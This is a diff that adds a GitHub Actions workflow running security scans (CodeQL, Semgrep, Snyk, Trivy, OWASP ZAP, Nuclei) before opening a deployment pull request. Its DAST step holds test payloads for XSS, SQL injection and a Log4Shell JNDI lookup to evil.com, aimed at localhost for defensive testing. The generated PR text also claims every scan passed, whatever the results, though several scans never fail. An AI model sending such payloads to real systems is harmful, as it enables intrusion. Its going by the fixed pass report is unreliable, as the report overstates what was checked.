@@ -1,0 +1,397 @@
+# Complete CI/CD Pipeline with SAST and DAST
+# Place this in your APPLICATION repository: .github/workflows/secure-ci.yml
+
+name: Secure CI/CD Pipeline with SAST & DAST
+
+on:
+  push:
+    branches: [main, develop]
+  pull_request:
+    branches: [main]
+
+env:
+  REGISTRY: ghcr.io
+  IMAGE_NAME: ${{ github.repository }}
+  NODE_VERSION: '18'
+
+jobs:
+  # ================================
+  # SAST - Static Application Security Testing
+  # ================================
+  sast-code-scanning:
+    name: 🔍 SAST - Code Security Scan
+    runs-on: ubuntu-latest
+    permissions:
+      security-events: write
+      contents: read
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      # GitHub Advanced Security - CodeQL
+      - name: Initialize CodeQL
+        uses: github/codeql-action/init@v3
+        with:
+          languages: javascript
+          queries: security-extended,security-and-quality
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: ${{ env.NODE_VERSION }}
+          cache: 'npm'
+
+      - name: Install dependencies
+        run: npm ci
+
+      - name: Perform CodeQL Analysis
+        uses: github/codeql-action/analyze@v3
+
+      # Semgrep SAST Scanner
+      - name: Run Semgrep SAST
+        uses: semgrep/semgrep-action@v1
+        with:
+          config: >-
+            p/security-audit
+            p/secrets
+            p/owasp-top-ten
+            p/nodejs
+        env:
+          SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}
+
+      # Bandit for Python (if applicable)
+      - name: Run Bandit Security Scan
+        if: contains(github.repository, 'python')
+        run: |
+          pip install bandit
+          bandit -r . -f json -o bandit-report.json || true
+          
+      - name: Upload Bandit Results
+        if: contains(github.repository, 'python')
+        uses: actions/upload-artifact@v4
+        with:
+          name: bandit-results
+          path: bandit-report.json
+
+  # ================================
+  # Dependency Vulnerability Scanning
+  # ================================
+  dependency-scan:
+    name: 📦 Dependency Vulnerability Scan
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: ${{ env.NODE_VERSION }}
+          cache: 'npm'
+
+      # npm audit for Node.js dependencies
+      - name: npm Security Audit
+        run: |
+          npm ci
+          npm audit --audit-level=moderate --json > npm-audit.json || true
+          cat npm-audit.json
+
+      # Snyk dependency scanning
+      - name: Run Snyk Security Scan
+        uses: snyk/actions/node@master
+        env:
+          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+        with:
+          args: --severity-threshold=high --json > snyk-results.json
+        continue-on-error: true
+
+      - name: Upload Snyk Results
+        uses: actions/upload-artifact@v4
+        with:
+          name: snyk-results
+          path: snyk-results.json
+
+      # OWASP Dependency Check
+      - name: Run OWASP Dependency Check
+        uses: dependency-check/Dependency-Check_Action@main
+        with:
+          project: ${{ github.repository }}
+          path: '.'
+          format: 'ALL'
+          args: >
+            --enableRetired
+            --enableExperimental
+            --nvdApiKey ${{ secrets.NVD_API_KEY }}
+
+      - name: Upload OWASP Results
+        uses: actions/upload-artifact@v4
+        with:
+          name: dependency-check-results
+          path: reports/
+
+  # ================================
+  # Secret Scanning
+  # ================================
+  secret-scan:
+    name: 🔐 Secret Scanning
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      # TruffleHog secret scanning
+      - name: Run TruffleHog Secret Scan
+        uses: trufflesecurity/trufflehog@main
+        with:
+          path: ./
+          base: main
+          head: HEAD
+          extra_args: --debug --only-verified
+
+      # GitLeaks secret scanning
+      - name: Run GitLeaks
+        uses: gitleaks/gitleaks-action@v2
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GITLEAKS_LICENSE: ${{ secrets.GITLEAKS_LICENSE }}
+
+  # ================================
+  # Build and Container Scanning
+  # ================================
+  build-and-container-scan:
+    name: 🐳 Build & Container Security Scan
+    runs-on: ubuntu-latest
+    needs: [sast-code-scanning, dependency-scan, secret-scan]
+    outputs:
+      image-digest: ${{ steps.build.outputs.digest }}
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@v3
+
+      - name: Login to Container Registry
+        uses: docker/login-action@v3
+        with:
+          registry: ${{ env.REGISTRY }}
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Build Docker Image
+        id: build
+        uses: docker/build-push-action@v5
+        with:
+          context: .
+          push: true
+          tags: |
+            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:latest
+            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
+
+      # Trivy container vulnerability scanner
+      - name: Run Trivy Container Scan
+        uses: aquasecurity/trivy-action@master
+        with:
+          image-ref: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}
+          format: 'sarif'
+          output: 'trivy-results.sarif'
+
+      - name: Upload Trivy Results to GitHub Security
+        uses: github/codeql-action/upload-sarif@v3
+        with:
+          sarif_file: 'trivy-results.sarif'
+
+      # Grype container scanning
+      - name: Run Grype Container Scan
+        uses: anchore/scan-action@v3
+        with:
+          image: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}
+          fail-build: false
+          severity-cutoff: high
+
+      # Hadolint Dockerfile linting
+      - name: Lint Dockerfile with Hadolint
+        uses: hadolint/hadolint-action@v3.1.0
+        with:
+          dockerfile: Dockerfile
+          format: sarif
+          output-file: hadolint-results.sarif
+
+      - name: Upload Hadolint Results
+        uses: github/codeql-action/upload-sarif@v3
+        with:
+          sarif_file: hadolint-results.sarif
+
+  # ================================
+  # DAST - Dynamic Application Security Testing
+  # ================================
+  dast-security-scan:
+    name: 🌐 DAST - Dynamic Security Scan
+    runs-on: ubuntu-latest
+    needs: build-and-container-scan
+    services:
+      app:
+        image: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}
+        ports:
+          - 3000:3000
+        options: >-
+          --health-cmd "curl -f http://localhost:3000/health || exit 1"
+          --health-interval 30s
+          --health-timeout 10s
+          --health-retries 5
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Wait for application to be ready
+        run: |
+          timeout 300 bash -c 'until curl -f http://localhost:3000; do sleep 5; done'
+
+      # OWASP ZAP Dynamic Security Testing
+      - name: ZAP Baseline Scan
+        uses: zaproxy/action-baseline@v0.10.0
+        with:
+          target: 'http://localhost:3000'
+          rules_file_name: '.zap/rules.tsv'
+          cmd_options: '-a'
+
+      - name: ZAP Full Scan
+        uses: zaproxy/action-full-scan@v0.8.0
+        if: github.ref == 'refs/heads/main'
+        with:
+          target: 'http://localhost:3000'
+          rules_file_name: '.zap/rules.tsv'
+          cmd_options: '-a'
+
+      # Nuclei security scanner
+      - name: Run Nuclei Scan
+        uses: projectdiscovery/nuclei-action@main
+        with:
+          target: 'http://localhost:3000'
+          github-report: true
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+
+      # Custom security tests
+      - name: Run Custom Security Tests
+        run: |
+          # Test for common vulnerabilities
+          curl -X POST http://localhost:3000/api/test -d "payload=<script>alert('xss')</script>"
+          curl -X GET "http://localhost:3000/api/users?id=1' OR '1'='1"
+          curl -H "X-Custom-Header: \${jndi:ldap://evil.com/a}" http://localhost:3000
+
+  # ================================
+  # Security Quality Gates
+  # ================================
+  security-quality-gate:
+    name: 🚨 Security Quality Gate
+    runs-on: ubuntu-latest
+    needs: [sast-code-scanning, dependency-scan, secret-scan, build-and-container-scan, dast-security-scan]
+    if: always()
+    steps:
+      - name: Download all artifacts
+        uses: actions/download-artifact@v4
+
+      - name: Security Quality Gate Check
+        run: |
+          echo "🔍 Evaluating security scan results..."
+          
+          # Check for high/critical vulnerabilities
+          FAIL_BUILD=false
+          
+          # Check Trivy results
+          if [ -f trivy-results.sarif ]; then
+            HIGH_VULNS=$(jq '.runs[0].results | map(select(.level == "error")) | length' trivy-results.sarif || echo "0")
+            if [ "$HIGH_VULNS" -gt 0 ]; then
+              echo "❌ Found $HIGH_VULNS high/critical vulnerabilities in container image"
+              FAIL_BUILD=true
+            fi
+          fi
+          
+          # Check dependency vulnerabilities
+          if [ -f npm-audit.json ]; then
+            CRITICAL_DEPS=$(jq '.metadata.vulnerabilities.critical // 0' npm-audit.json)
+            HIGH_DEPS=$(jq '.metadata.vulnerabilities.high // 0' npm-audit.json)
+            if [ "$CRITICAL_DEPS" -gt 0 ] || [ "$HIGH_DEPS" -gt 5 ]; then
+              echo "❌ Found critical or too many high severity dependency vulnerabilities"
+              FAIL_BUILD=true
+            fi
+          fi
+          
+          if [ "$FAIL_BUILD" = true ]; then
+            echo "🚨 Security quality gate failed - blocking deployment"
+            exit 1
+          else
+            echo "✅ Security quality gate passed"
+          fi
+
+  # ================================
+  # Create Secure Deployment PR
+  # ================================
+  create-secure-deployment-pr:
+    name: 🚀 Create Secure Deployment PR
+    runs-on: ubuntu-latest
+    needs: security-quality-gate
+    if: github.ref == 'refs/heads/main' && success()
+    steps:
+      - name: Create Deployment PR with Security Report
+        uses: peter-evans/create-pull-request@v5
+        with:
+          token: ${{ secrets.GITOPS_TOKEN }}
+          repository: khoitranlord/argo-cicd
+          branch: secure-deploy/${{ github.sha }}
+          title: "🔒 Secure Deploy: ${{ github.repository }}:${{ github.sha }}"
+          body: |
+            ## 🔒 Security-Verified Deployment
+            
+            **Application**: ${{ github.repository }}
+            **Image**: `${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}`
+            **Security Status**: ✅ **PASSED ALL SECURITY SCANS**
+            
+            ### 🛡️ Security Scan Results
+            
+            #### SAST (Static Analysis)
+            - ✅ CodeQL security scan completed
+            - ✅ Semgrep SAST scan passed
+            - ✅ No critical security issues found in code
+            
+            #### Dependency Security
+            - ✅ npm audit completed
+            - ✅ Snyk vulnerability scan passed
+            - ✅ OWASP dependency check completed
+            
+            #### Container Security
+            - ✅ Trivy container scan passed
+            - ✅ Grype vulnerability scan completed
+            - ✅ Dockerfile security best practices verified
+            
+            #### DAST (Dynamic Analysis)
+            - ✅ OWASP ZAP security scan completed
+            - ✅ Nuclei security tests passed
+            - ✅ No runtime vulnerabilities detected
+            
+            #### Secret Scanning
+            - ✅ TruffleHog secret scan passed
+            - ✅ GitLeaks scan completed
+            - ✅ No exposed secrets detected
+            
+            ### 📊 Security Quality Gate
+            - ✅ **All security checks passed**
+            - ✅ **Ready for deployment**
+            
+            ### 🔗 Security Reports
+            - [Security Scan Results](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})
+            - [Container Vulnerability Report](link-to-trivy-report)
+            - [Code Security Analysis](link-to-codeql-report)
+            
+            ---
+            
+            **🔐 This deployment has been security-verified and is safe to deploy.**
+          labels: |
+            deployment
+            security-verified
+            auto-generated
